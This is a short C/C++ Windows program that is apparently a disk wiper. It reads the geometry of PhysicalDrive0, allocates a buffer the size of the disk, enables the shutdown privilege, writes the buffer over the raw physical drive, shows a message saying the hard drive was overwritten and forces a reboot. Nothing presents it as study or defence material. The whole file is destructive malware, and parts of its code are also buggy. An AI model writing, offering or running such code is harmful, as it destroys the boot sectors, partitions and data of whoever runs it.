#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

BOOL GetDriveGeometry(LPCSTR wszPath, DISK_GEOMETRY* pdg)
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined 
    BOOL bResult = FALSE;                 // results flag
    DWORD junk = 0;                     // discard results

    hDevice = CreateFileA(wszPath,          // drive to open
        0,                // no access to the drive
        FILE_SHARE_READ | // share mode
        FILE_SHARE_WRITE,
        NULL,             // default security attributes
        OPEN_EXISTING,    // disposition
        0,                // file attributes
        NULL);            // do not copy file attributes

    if (hDevice == INVALID_HANDLE_VALUE)    // cannot open the drive
    {
        return (FALSE);
    }

    bResult = DeviceIoControl(hDevice,                       // device to be queried
        IOCTL_DISK_GET_DRIVE_GEOMETRY, // operation to perform
        NULL, 0,                       // no input buffer
        pdg, sizeof(*pdg),            // output buffer
        &junk,                         // # bytes returned
        (LPOVERLAPPED)NULL);          // synchronous I/O

    CloseHandle(hDevice);

    return (bResult);
}

int main(void) {

    DISK_GEOMETRY pdg = { 0 }; // disk drive geometry structure
    BOOL bResult = FALSE;      // generic results flag
    ULONGLONG DiskSize = 0;    // size of the drive, in bytes

    bResult = GetDriveGeometry("\\\\.\\PhysicalDrive0", &pdg);

    DiskSize = pdg.Cylinders.QuadPart * (ULONG)pdg.TracksPerCylinder * (ULONG)pdg.SectorsPerTrack * (ULONG)pdg.BytesPerSector;

    char file[MAX_PATH];
    char path[60];
    HANDLE hToken;
    LUID luid;
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &luid);
    TOKEN_PRIVILEGES tp;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    tp.PrivilegeCount = 1;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
    DWORD write;
    char *data = new char [DiskSize];
    ZeroMemory(&data, sizeof(data));
    HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    WriteFile(disk, data, DiskSize, &write, NULL);
    CloseHandle(disk);
    MessageBoxA(0, "Harddrive overwritten successfuly.", "Overwrite successful", MB_ICONWARNING);
    ExitWindowsEx(EWX_REBOOT, 0);
    return 0;
}